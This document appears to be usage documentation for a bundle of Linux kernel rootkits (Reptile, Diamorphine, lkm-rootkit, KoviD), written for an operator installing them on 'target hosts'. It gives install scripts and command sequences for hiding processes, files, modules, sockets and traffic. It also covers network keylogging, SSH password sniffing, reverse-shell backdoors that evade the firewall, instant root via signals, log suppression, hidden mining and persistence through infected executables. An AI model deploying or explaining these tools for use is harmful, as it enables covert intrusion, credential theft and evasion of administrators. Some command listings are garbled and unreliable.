All Rootkits are heavely encrypted and useless without the cstk script
#################
# Reptile usage #
#################

Tested on:
 - Debian 9: 4.9.0-8-amd64
 - Debian 10: 4.19.0-8-amd64
 - Ubuntu 18.04.1 LTS: 4.15.0-38-generic
 - Kali Linux: 4.18.0-kali2-amd64
 - Centos 6.10: 2.6.32-754.6.3.el6.x86_64
 - Centos 7: 3.10.0-862.3.2.el7.x86_64
 - Centos 8: 4.18.0-147.5.1.el8_1.x86_64

Run the Reptile.sh script on target host
```bash
bash Reptile.sh
```
###################
# Diamphime usage #
###################

Diamorphine is a LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/5.x/6.x (x86/x86_64 and ARM64)
Features:
- When loaded, the module starts invisible;
- Hide/unhide any process by sending a signal 31;
- Sending a signal 63(to any pid) makes the module become (in)visible;
- Sending a signal 64(to any pid) makes the given user become root;
- Files or directories starting with the MAGIC_PREFIX become invisible;
- Source: https://github.com/m0nad/Diamorphine

# Install
Verify if the kernel is 2.6.x/3.x/4.x/5.x
```
uname -r
```
Run the Diamphine.sh script on the target host
```bash
bash Diamorphine.sh
```

# Uninstall
The module starts invisible, to remove you need to make it visible
```
kill -63 0
```
Then remove the module(as root)
```
sudo rmmod diamorphine
```
#####################
# lkm-rootkit usage #
#####################

Run the lkm_rootkit.sh script on the target host
```bash
bash lkm_rootkit.sh
```
When loading the rootkit, so is an UDP server inside this module. This UDP server acts as a server and a client 
To send commands to this kernel module, run the [nc] command on your machine. The port is always [8071]
```bash
nc -4 -u localhost 8071
```
## System call table hook
The system call table is located at the beginning, reading from the MSR_LSTAR register. 
The address then is stored in an extern pointer which every file can access, if the files includes the include.h file. 
This address is then used to alter specific system call entries, like the getdents/getdents64 function for file hiding.

## File hiding
This functionality allows the user to fide files starting with the rootkit_ and .rootkit_ prefix. 
Also, all file descriptors refering to a hidden file will be hidden too but the file is still accesible to those who know that the file is there 
(i. e. opening the file via terminal is still possible if you know the path to the file). 
To enable file hiding from your machine, use the covert channel and send the command
```bash
hidefile
```
Unhide file
```bash
showfile
```
## Kernel module hiding
All kernel modules are being listed when typing lsmod. To prevent this module from being detected,
```bash
hidemod
```
Unhide 
```bash
showmod
```
## Network keylogging
> **Note:** This functionality requires a [ syslog-ng server ] on the users machine. 
> The destination port for receiving keylogger data is 514, which can also be changed in the include.h on line 29 (SYS_PORT).

Enable keylogger
```bash
keylog
```
This command hooks the /dev/ttyS0 read function on the victims machine, storing all data typed in a terminal. 
The rootkit module allocates a buffer for every terminal (i. e. multiple PIDs when multiple terminals) and sends them to the user (you). 
The data is then stored in your log file (path of the file depends on how you configure your[ syslog-ng server ] on your machine). 
To disable the keylogger, send
```bash
keyunlog
```
## IPv4/IPv6 packet hiding

This time, we need to specify a transportation protocol and a senders IP address as a param, for example:
```bash
hidepacket-udp4-192.168.2.141
```
or for IPv6 addresses, either the full or shortened way:
```bash
hidepacket-udp6-0123:4567:89ab:cdef:0123:4567:89ab:cdef
hidepacket-tcp6-::1
```
Accepted address types are [ udp4, udp6, tcp4 and tcp6 ]
The rootkit automatically detects the IP version, so there's no need for more information.

disable packet hiding
```bash
showpacket-udp6-0123:4567:89ab:cdef:0123:4567:89ab:cdef
showpacket-tcp6-::1
```
The IP address should be the same address you sent to the kernel module when hiding all packets from and to this specific address.

## Port knocking
Port knocking allows the user to hide specific ports on the victims machine, only accesable to whom "knocks" on a specific order of different ports. 
First of all, you send a message to your rootkit declaring the port you want to hide:
```bash
hideport-12345
```
When trying to send a message via [nc] to this specific port on your victims machine, the port is not accessible. 
You have to knock on other ports first to gain access to your hidden port. 
As for now, the "knocking ports" are always[ 2345, 3456 and 4567 ]. 
Those ports can be changed in the port_knocking.c file on line 14 (knocking_ports). 
If you want to change the amount of ports to knock you have to alter the array size defined in port_knocking.h on line 15 (KNOCKING_LENGTH). 
To make the hidden port visible again, send the command:
```bash
showport-12345
```
## Privilege escalation
> **Note:** This functionality is still buggy. Please be careful with your machine when escalating a process.

Escalating a process privileges to root and also make this process adopted by the init process. 
To escalate a process to root, send the command escalate along with the PID of the process to your rootkit:
```bash
escalate-12345
```
After this all child processes born from this process also have root privileges. 
If the specific process already has children, the privileges of the children don't change. 
The specific process is now adopted by the init process. 
The children of this process are unaffected by this action. 
To deescalate a process to its original privileges, send
```bash
deescalate-12345
```
> Note: You can only deescalate processes you have escalated before.

## Socket hiding
To hide a socket you need to specify a transportation protocol and a port (similar to the packet hiding functionality). 
The supported protocols are the same (udp4, udp6, tcp4, tcp6). For example:
```bash
hidesocket-udp4-12345
hidesocket-udp6-12346
hidesocket-tcp4-12347
hidesocket-tcp6-12348
```
The socket is now hidden, but still accessible. 
This way you can hide the communication channel between your host and the victims machine. 
The victim cannot detect the socket you use to send commands to your rootkit module. 
To make a socket visible again, send
```bash
showsocket-udp4-12345
showsocket-udp6-12346
showsocket-tcp4-12347
showsocket-tcp6-12348
```
###################
# KoviD LKM usage #
###################
Run the KoviD.sh script on the target host
```bash
bash KoviD.sh
```

KoviD is a Loadable Kernel Module (LKM) designed for Linux Kernel version 5 and later. Key features include:

 - Self-hiding from SysFS.
 - Provides reverse shell backdoors.
 - Conceals processes from the proc file system.
 - Handles child processes, newly created processes.
 - Hides KauditD logs, syslogs, user presence.
 - Conceals CPU usage for all hidden tasks.
 - Grants root privileges.
 - Hides files and directories.
 - Explore Demos repository.

### Tested against
CentOS Linux release 8.3.2011 4.18.0-240.22.1.el8_3.x86_64 #1 SMP x86_64 GNU/Linux
gcc (GCC) 8.3.1 20191121 (Red Hat 8.3.1-5)

Debian GNU/Linux 10 Linux debian10teste 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 x86_64 GNU/Linux
gcc (Debian 8.3.0-6) 8.3.0

Ubuntu 18.04.5 LTS Linux ubuntu 5.4.0-89-generic #100~18.04.1-Ubuntu SMP x86_64 GNU/Linux
gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0

Ubuntu 20.10 Linux ubuntu 5.8.0-55-generic #62-Ubuntu SMP x86_64 GNU/Linux
gcc (Ubuntu 10.3.0-1ubuntu1~20.10) 10.3.0

Ubuntu 22.04 LTS Linux 5.15.0-43-generic #46-Ubuntu SMP x86_64 GNU/Linux
gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0

Ubuntu 22.04.1 LTS Linux hash-virtual-machine 5.19.0-41-generic #42~22.04.1-Ubuntu SMP PREEMPT_DYNAMIC UTC 2 x86_64 GNU/Linux

## Features

### Hide itself (module)
KoviD hides itself, making it challenging to detect. It customizes kernel code to evade anti-rootkit detectors and disappears from /sys/module listings.

### Hide files and directories
KoviD hides files and directories effectively by hijacking filldir and filldir64 kernel functions, significantly simplifying the process.

### Function and syscall hijacking: Ftrace
KoviD leverages Ftrace, a legitimate method for function and syscall hijacking in Kernel v5+.
This approach offers greater stability compared to traditional hooking techniques.

### Backdoors
KoviD incorporates popular and reliable methods for backdooring systems, such as port-knocking with custom packets.
These open connections to Netcat, OpenSSL, and Socat sessions.

### Firewall Evasion
KoviD sends magic packets and establishes reverse shell connections.
These packets trigger netfilter hooks and instruct KoviD to create a reverse shell connection. 
These outgoing packets bypass iptables rules, ensuring effective evasion.

### Tasks
Hiding processes is a crucial feature, giving KoviD the ability to run undetected. 
It provides full support for children processes, ensuring that no hanging processes are left behind.

### Logs
KoviD's hidden tasks result in missing logs, making it even more challenging for administrators to detect its presence. 
It eliminates logs generated by userland tools like w, lsmod, ps, who, ls.

### TCP/UDP logs
KoviD hides network connections and manipulates network logs to maintain stealth. 
It also addresses issues with libpcap showing connections initiated before task hiding.

### r00t
Gain root privileges easily with kill -SIGCONT 666.

### CPU - hiding/mining
KoviD hides CPU consumption, making its processes invisible as heavy consumers. 
However, be cautious not to max out the CPU, as this can lead to unusual usage patterns.

### Persistence
KoviD offers persistence via Volundr. 
It can infect executables, like SSHD, to ensure KoviD loads on reboot. 
You can also use your preferred tool, Volundr use here is just a suggestion.

### Base address
KoviD allows for the retrieval of base addresses of other executables without needing to open /proc/<pid>/maps.

### BPF
KoviD can evade few anti-rootkit tools that rely on BPF (Berkeley Packet Filter) for detecting rootkits.
Tested against: https://github.com/pathtofile/bpf-hookdetect.git

### Tainted

```bash
sudo insmod ./kovid.ko
cat /proc/sys/kernel/tainted
```

## Usage
/proc/867530 interface
To enable the /proc/867530 interface, use the command:
```bash
kill -SIGCONT 31337
```
The interface will disable itself after 120 seconds and can be reactivated using the same command.

# Tasks
 You can hide/unhide processes using the /proc/867530 interface.
 For example, to hide a task, run: $ echo 14886 >/proc/867430
 If a task is a backdoor that needs tcp hiding, run:
 ```bash
echo "-bd <pid>" >/proc/867530
```
 Unhiding is the same as for regular tasks:
 ```bash
echo "<PID>" >/proc/867530
```
### Hide module
To hide the KoviD module, use the command: 
```bash
echo -h >/proc/867530
```
In release mode, the module is hidden by default, and a key can be displayed by running 
```bash
cat /proc/867530
```
### Hide/unhide/list files and directories
To hide a file or directory, use: 
```bash
echo '-a name' >/proc/867530
```
To unhide use:

```bash
echo '-d name' >/proc/867530 
``` 
You can list hidden files and directory names with:

```bash
echo listname >/proc/867530
```

### SSH/FTP TTY sniffer
KoviD can snoop SSH sessions via tty keystrokes and steal passwords and commands effectively.

### Backdoors
For instructions, run 
```bash
scripts/bdclient.sh
``` 

#1 /proc interface turn on
kill -SIGCONT 31337
#2 /proc interface turn off
kill -SIGCONT 31337
#3 Get ROOT
kill -SIGCONT 666
su
#4 Hide a PID
echo <pid> >/proc/867530
#5 Unhide a PID
echo <pid> >/proc/867530
#6 Hide a PID in backdoor-style, hide children
echo "-bd <pid> >/proc/867530
#7 Undo #6
echo <pid> >/proc/867530
#8 Hide KoviD module from lsmod/sysfs  if not built with DEPLOY=1
echo "-h" >/proc/867530
#9 Undo #8 - can rmmod after
cat ```/proc/867530``` >/proc/867530
#10 List hidden taks - debug mode only
echo "-s" >/proc/867530
dmesg
#11 Hide README.txt
# At current directory only
echo "-a README.txt" >/proc/867530
# At full-path
echo "-a /home/files/README.txt" >/proc/867530

#11 Hide README.txt globally - hide all instances of README.txt
# bypass #10 and #11
echo "-g README.txt" >/proc/867530
#13 Hide ALL files named README.txt - this bypass #11
echo "-a README.txt" >/proc/867530
#14 Undo #12 - this bypass #11
echo "-d README.txt" >/proc/867530
#15 List hidden tasks - debug mode only
echo "-s" >/proc/867530
dmesg
#16 List hidden files and directories - debug mode only
echo "-l" >/proc/867530
dmesg

#17 Mark tty log file to be removed when KoviD is rmmod'ed
echo "-t0" >/proc/867530
#18 Undo #15
echo "-t1" >/proc/867530
#19 Fetch the base address of a running process by PID number
echo "-b <PID>">/proc/867530
cat /proc/867530
#20 Fetch Magik Word
cat /proc/867530
